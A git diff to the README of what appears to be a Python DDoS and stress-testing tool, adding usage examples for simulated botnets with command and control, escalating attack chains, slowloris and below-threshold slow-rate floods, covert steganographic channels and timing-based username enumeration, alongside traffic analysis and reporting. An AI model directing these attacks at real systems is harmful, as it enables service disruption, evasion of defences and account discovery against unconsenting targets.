@@ -151,6 +151,44 @@ python ddos.py --help
 | GraphQL Deep Query | GraphQL   | Deeply nested queries   |
 | GraphQL Batch      | GraphQL   | Batched query attack    |
 
+### Advanced Timing Attacks
+
+| Attack              | Type    | Description                       |
+| ------------------- | ------- | --------------------------------- |
+| Slow Rate           | Evasion | Below-threshold request rate      |
+| Advanced Slowloris  | L7      | Enhanced connection holding       |
+| Resource Exhaustion | Timing  | Time-based resource depletion     |
+| Synchronized Pulse  | Timing  | Coordinated burst attacks         |
+| Timing Side-Channel | Recon   | Information extraction via timing |
+
+### Steganography & Covert Channels
+
+| Method             | Type    | Description                   |
+| ------------------ | ------- | ----------------------------- |
+| LSB Encoding       | Image   | Least significant bit hiding  |
+| Whitespace         | Text    | Invisible character encoding  |
+| Unicode Homoglyphs | Text    | Character substitution        |
+| Protocol Headers   | Network | Data in HTTP headers          |
+| Timing Channels    | Covert  | Data encoded in packet timing |
+
+### Botnet Simulation
+
+| Feature          | Type    | Description                    |
+| ---------------- | ------- | ------------------------------ |
+| Bot Coordination | C2      | Simulated command & control    |
+| Hierarchical C2  | C2      | Multi-tier botnet structure    |
+| Attack Waves     | Pattern | Pulse, ramp, random patterns   |
+| Bot Behavior     | Sim     | Realistic bot state management |
+
+### Attack Chaining
+
+| Feature            | Type | Description                    |
+| ------------------ | ---- | ------------------------------ |
+| Sequential Chains  | Flow | Step-by-step attack execution  |
+| Parallel Chains    | Flow | Concurrent attack execution    |
+| Conditional Chains | Flow | Response-based branching       |
+| Escalation Chains  | Auto | Automatic intensity escalation |
+
 ## Usage
 
 ```bash
@@ -385,6 +423,201 @@ print(f"JA3 Hash: {ja3_random.get_ja3_hash()}")
 header_random = HeaderRandomizer()
 headers = header_random.randomize_headers(base_headers)
 headers = header_random.add_noise_headers(headers)
+```
+
+## Advanced Attack Features
+
+### Botnet Simulation
+
+```python
+from core.attacks import BotnetController, HierarchicalBotnet, AttackWave, Command, CommandType
+
+# Simple botnet simulation
+controller = BotnetController(bot_count=50)
+await controller.initialize()
+await controller.start_all()
+
+# Launch coordinated attack
+await controller.launch_attack(
+    target="192.168.1.100",
+    port=80,
+    duration=60,
+    rate_per_bot=100,
+    attack_type="http"
+)
+
+# Hierarchical botnet (multi-tier C2)
+botnet = HierarchicalBotnet(regions=3, bots_per_region=20)
+await botnet.initialize()
+await botnet.coordinated_attack("192.168.1.100", port=80, stagger=0.5)
+
+# Attack wave patterns
+wave = AttackWave(controller)
+await wave.pulse_attack("192.168.1.100", 80, pulses=5, pulse_duration=10)
+await wave.ramp_attack("192.168.1.100", 80, start_rate=10, end_rate=1000)
+```
+
+### Attack Chaining
+
+```python
+from core.attacks import ChainBuilder, AttackChain, EscalationChain, ParallelChain
+
+# Build attack chain with fluent API
+chain = (ChainBuilder("recon_and_attack")
+    .with_config(max_duration=300, stop_on_failure=False)
+    .add_recon("192.168.1.100")
+    .add_probe("192.168.1.100")
+    .add_attack("192.168.1.100", attack_type="http", rate=1000)
+    .build())
+
+results = await chain.execute()
+
+# Automatic escalation
+escalation = EscalationChain("192.168.1.100", port=80)
+results = await escalation.execute(target_impact=0.7)  # Escalate until 70% impact
+
+# Parallel attack execution
+parallel = ParallelChain(ChainConfig())
+parallel.add_parallel_group([step1, step2, step3])  # Execute simultaneously
+await parallel.execute()
+```
+
+### Steganography & Covert Channels
+
+```python
+from core.attacks import CovertChannel, StegoMethod, LSBEncoder, WhitespaceEncoder
+
+# Create covert channel with encryption
+channel = CovertChannel(method=StegoMethod.LSB, key=b"secret-key")
+
+# Hide data in carrier
+carrier = channel.generate_carrier(4096)
+hidden = channel.hide(carrier, b"secret attack commands")
+revealed = channel.reveal(hidden)
+
+# Protocol header steganography
+from core.attacks import ProtocolHeaderEncoder, StegoConfig
+encoder = ProtocolHeaderEncoder(StegoConfig())
+http_request = encoder.encode(b"", b"hidden payload")
+
+# Timing-based covert channel
+from core.attacks import TimingEncoder
+timing = TimingEncoder(StegoConfig())
+delays = timing.get_delays(b"secret data")  # Encode in packet timing
+```
+
+### Advanced Timing Attacks
+
+```python
+from core.attacks import SlowRateAttack, SlowlorisAdvanced, TimingSideChannel
+
+# Slow rate attack (below detection threshold)
+slow = SlowRateAttack("192.168.1.100", 80, requests_per_minute=10)
+await slow.start(duration=300)
+
+# Advanced slowloris with evasion
+slowloris = SlowlorisAdvanced("192.168.1.100", 80, connections=200)
+await slowloris.start(duration=300)
+
+# Timing side-channel analysis
+analyzer = TimingSideChannel("192.168.1.100", 80)
+valid_users = await analyzer.detect_valid_usernames(
+    ["admin", "root", "user", "test"],
+    login_path="/login"
+)
+```
+
+## Traffic Intelligence
+
+```python
+from core.intelligence import TrafficIntelligence, AnomalyDetector, ProtocolFingerprinter
+
+# Comprehensive traffic analysis
+intel = TrafficIntelligence()
+result = intel.analyze_packet(
+    data=packet_data,
+    src_ip="192.168.1.1",
+    dst_ip="10.0.0.1",
+    src_port=12345,
+    dst_port=80
+)
+print(f"Traffic type: {result['packet']['traffic_type']}")
+print(f"Threat level: {result['threat_level']}")
+
+# Anomaly detection
+detector = AnomalyDetector()
+for packet in packets:
+    anomalies = detector.analyze(packet)
+    if anomalies:
+        print(f"Detected: {[a.anomaly_type.value for a in anomalies]}")
+
+# Protocol fingerprinting
+fp = ProtocolFingerprinter()
+http_info = fp.fingerprint_http(response)
+ssh_info = fp.fingerprint_ssh(banner)
+tls_info = fp.fingerprint_tls(client_hello)
+```
+
+## Network Simulation
+
+```python
+from core.simulation import NetworkSimulator, NetworkCondition, NetworkTopology
+from core.simulation import LoadBalancer, FirewallSimulator, TargetSimulator
+
+# Simulate network conditions
+sim = NetworkSimulator()
+sim.set_profile(NetworkCondition.POOR)  # 150ms latency, 5% loss
+success, data, latency = await sim.simulate_send(packet)
+
+# Create network topology
+topo = NetworkTopology()
+topo.create_star_topology("switch", ["server1", "server2", "server3"])
+path = topo.find_path("server1", "server3")
+latency = topo.calculate_path_latency(path)
+
+# Load balancer simulation
+lb = LoadBalancer(algorithm="least_connections")
+lb.add_backend("server1", weight=2)
+lb.add_backend("server2", weight=1)
+backend = lb.get_backend()
+
+# Firewall simulation
+fw = FirewallSimulator()
+fw.add_rule("rate_limit", src_ip="*", rate_limit=100)
+fw.block_ip("192.168.1.100")
+allowed = fw.check_packet("192.168.1.1", 80)
+
+# Target server simulation
+target = TargetSimulator(max_rps=10000)
+success, response_time, status = await target.handle_request()
+print(f"Server health: {target.get_health()}")
+```
+
+## Advanced Reporting
+
+```python
+from core.reporting import ReportManager, ReportFormat
+
+# Track attack and generate report
+manager = ReportManager()
+report_id = manager.start_attack("HTTP Flood", "192.168.1.100", 80)
+
+# Record metrics during attack
+for response in responses:
+    manager.record_request(
+        response_time_ms=response.time,
+        bytes_sent=response.bytes_sent,
+        status_code=response.status
+    )
+
+# Generate report
+report = manager.end_attack(summary="Test completed successfully")
+
+# Export in various formats
+print(manager.export_report(report_id, ReportFormat.TEXT))
+print(manager.export_report(report_id, ReportFormat.JSON))
+print(manager.export_report(report_id, ReportFormat.HTML))
+print(manager.export_report(report_id, ReportFormat.MARKDOWN))
 ```
 
 ## Distributed Testing
